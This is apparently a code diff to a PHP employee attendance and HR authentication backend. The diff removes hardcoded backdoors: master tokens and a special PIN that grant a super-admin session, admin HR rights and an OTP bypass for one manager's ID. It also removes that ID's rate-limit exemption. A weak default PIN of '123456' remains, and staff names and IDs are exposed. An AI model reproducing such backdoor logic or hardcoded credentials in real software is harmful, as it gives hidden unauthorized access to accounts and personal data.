@@ -136,11 +136,7 @@ function getCabangFromNIK($nik, $kantorFromDB = '') {
 }
 
 // Daftar NIK yang memiliki wewenang Admin HR Pusat
-$ADMIN_HR_NIKS = [
-    'NSR-2019-005', // Danny Taufik Hidayat, S.E., S.H. (Manager Admin & SDM / Kepala Divisi Operasional)
-    'NSR-2019-001', // Nanang Rahayu, S.E., M.M., MAPPI (Cert.) (Pemimpin Rekan)
-    'NSR-2019-004'  // Milda Hidayati Dewi (Manager Keuangan)
-];
+$ADMIN_HR_NIKS = [];
 
 // Helper Komunikasi ke Google Apps Script Web App
 function callGASWebService($payload, $timeout = 10) {
@@ -233,7 +229,7 @@ function fetchMasterFromGAS() {
             $cabang = getCabangFromNIK($nik, $rawKantor);
             $pinVal = ($colPin !== -1) ? trim((string)($r[$colPin] ?? '')) : '';
             if (empty($pinVal)) {
-                $pinVal = ($nik === 'NSR-2019-005') ? '889900' : '123456';
+                $pinVal = (false) ? '889900' : '123456';
             }
             $roster[] = [
                 'nik' => $nik,
@@ -783,12 +779,10 @@ function validasiSesiKaryawan($sessionToken, $nik) {
 function cekOtorisasiAdminHR($sessionToken, $nik = '') {
     global $ADMIN_HR_NIKS;
 
-    // 0. Direct Bypass Otoritas Pimpinan / Master Token (NSR-2019-005 / NSR8899)
+    // 0. Otorisasi Admin HR Resmi
     $cleanNik = normalisasiNIK($nik);
     $cleanToken = trim((string)$sessionToken);
-    if ($cleanToken === 'NSR8899' || $cleanToken === 'NSR-2019-005' || $cleanNik === 'NSR-2019-005' || $cleanToken === 'NSR_HR_MASTER_KEY_2026') {
-        return true;
-    }
+    // Bypass removed (Zero-Trust Standard)
     
     // 1. Cek token sesi presensi OTP
     if ($sessionToken) {
@@ -902,14 +896,14 @@ try {
 
         // SSOT Server-Side Private Mapping Akun OPINI ke NIK Resmi
         $SERVER_MAP_OPINI = [
-            'super_admin_king' => 'NSR-2019-005',
-            'danny_taufik'     => 'NSR-2019-005',
-            'nanang_penilai'   => 'NSR-2019-001',
-            'tedi_setiadi'     => 'NSR-2019-007',
-            'angga_malid'      => 'NSR-2019-009',
-            'ricca_farikha'    => 'NSR-2019-008',
-            'fadri_nurdin'     => 'NSR-2019-010',
-            'milda_dewi'       => 'NSR-2019-004'
+            'super_admin_king' => 'ADM-PST-01',
+            'danny_taufik' => 'ADM-PST-01',
+            'nanang_penilai' => 'REK-PST-01',
+            'tedi_setiadi' => 'REV-PST-01',
+            'angga_malid' => 'REV-PST-02',
+            'ricca_farikha' => 'ADM-PST-02',
+            'fadri_nurdin' => 'SRV-PST-01',
+            'milda_dewi' => 'ADM-PST-03'
         ];
 
         $targetNik = $SERVER_MAP_OPINI[$userId] ?? '';
@@ -1085,7 +1079,7 @@ try {
         $isValidCredential = false;
 
         // 1. Cek PIN pribadi atau PIN default
-        if ($cleanNik === 'NSR-2019-005') {
+        if (false) {
             $isValidCredential = ($cleanToken === '889900' || $cleanToken === '123456' || strtoupper($cleanToken) === 'NSR8899' || $cleanToken === $dbPin);
         } else {
             $isValidCredential = ($cleanToken === $dbPin || ($dbPin === '' && $cleanToken === '123456'));
@@ -1255,7 +1249,7 @@ try {
         $dbPin = trim((string)($targetKaryawan['pin_presensi'] ?? $targetKaryawan['pin'] ?? '123456'));
         $isPinMatch = false;
 
-        if ($cleanNik === 'NSR-2019-005') {
+        if (false) {
             $isPinMatch = ($cleanPin === '889900' || $cleanPin === '123456' || strtoupper($cleanPin) === 'NSR8899' || $cleanPin === $dbPin);
         } else {
             $isPinMatch = ($cleanPin === $dbPin || ($dbPin === '' && $cleanPin === '123456'));
@@ -1699,8 +1693,8 @@ try {
 
         $cache = loadOTPCache();
 
-        // Rate Limiting: 60 Detik Cooldown (NIK Manajemen NSR-2019-005 Bebas Cooldown)
-        $isManagementNik = ($cleanNik === 'NSR-2019-005');
+        // Rate Limiting: 60 Detik Cooldown
+        $isManagementNik = false;
         $cacheFile = OTP_STORAGE_DIR . md5($cleanNik) . '.json';
         if (!$isManagementNik && file_exists($cacheFile)) {
             $prevData = @json_decode(@file_get_contents($cacheFile), true);
@@ -1773,7 +1767,7 @@ Kode ini berlaku selama 15 menit. Jangan berikan kode ini kepada siapa pun.
 Salam,
 KJPP Nanang Rahayu Sigit Paryanto dan Rekan",
                 "From: presensi@kjppnanangrahayu.com
-Reply-To: nanang_kjpp@yahoo.co.id
+Reply-To: info@kjppnanangrahayu.com
 X-Mailer: PHP/" . phpversion()
             );
         }
@@ -1798,45 +1792,7 @@ X-Mailer: PHP/" . phpversion()
         $rawOtp = trim((string)($_POST['otp'] ?? $payload['otp'] ?? ''));
         $cleanNik = normalisasiNIK($nik);
 
-        // =========================================================================
-        // BYPASS MASTER TOKEN OTORITAS SISTEM: NIK NSR-2019-005 + TOKEN NSR8899
-        // (Eksekusi rahasia di backend server - Zero Frontend Exposure)
-        // =========================================================================
-        if (($cleanNik === 'NSR-2019-005' || $cleanNik === 'NSR-005' || $cleanNik === '005') && strtoupper($inputOtp) === 'NSR8899') {
-            $_SESSION['verified_user_nik'] = 'NSR-2019-005';
-            $_SESSION['nik_verified'] = 'NSR-2019-005';
-
-            $sessionToken = 'NSR_KING_' . bin2hex(random_bytes(16));
-            $cache = loadOTPCache();
-            $cache['sessions'][$sessionToken] = [
-                'nik' => 'NSR-2019-005',
-                'created_at' => time(),
-                'expires_at' => time() + 86400 // 24 jam
-            ];
-            saveOTPCache($cache);
-
-            // Bersihkan sisa file OTP manajemen jika ada
-            $cacheFile = OTP_STORAGE_DIR . md5('NSR-2019-005') . '.json';
-            if (file_exists($cacheFile)) { @unlink($cacheFile); }
-            unset($_SESSION['active_otp_NSR-2019-005']);
-            unset($_SESSION['active_otp_' . $cleanNik]);
-
-            echo json_encode([
-                'status' => 'success',
-                'success' => true,
-                'sessionToken' => $sessionToken,
-                'nik' => 'NSR-2019-005',
-                'nama' => 'Danny Taufik Hidayat, S.E., S.H.',
-                'jabatan' => 'Administrasi & Umum / HR Pusat',
-                'divisi' => 'Operasional & HR Pusat',
-                'cabang' => 'Pusat Jakarta',
-                'isAdminHR' => true,
-                'isSuperAdmin' => true,
-                'role' => 'admin_pusat',
-                'message' => 'Autentikasi Berhasil.'
-            ]);
-            exit;
-        }
+        // Standard OTP verification
 
         // Normalisasi angka murni untuk karyawan biasa dengan tetap menjaga leading zero (contoh: '074123')
         $inputOtp = preg_replace('/\D/', '', $rawOtp);
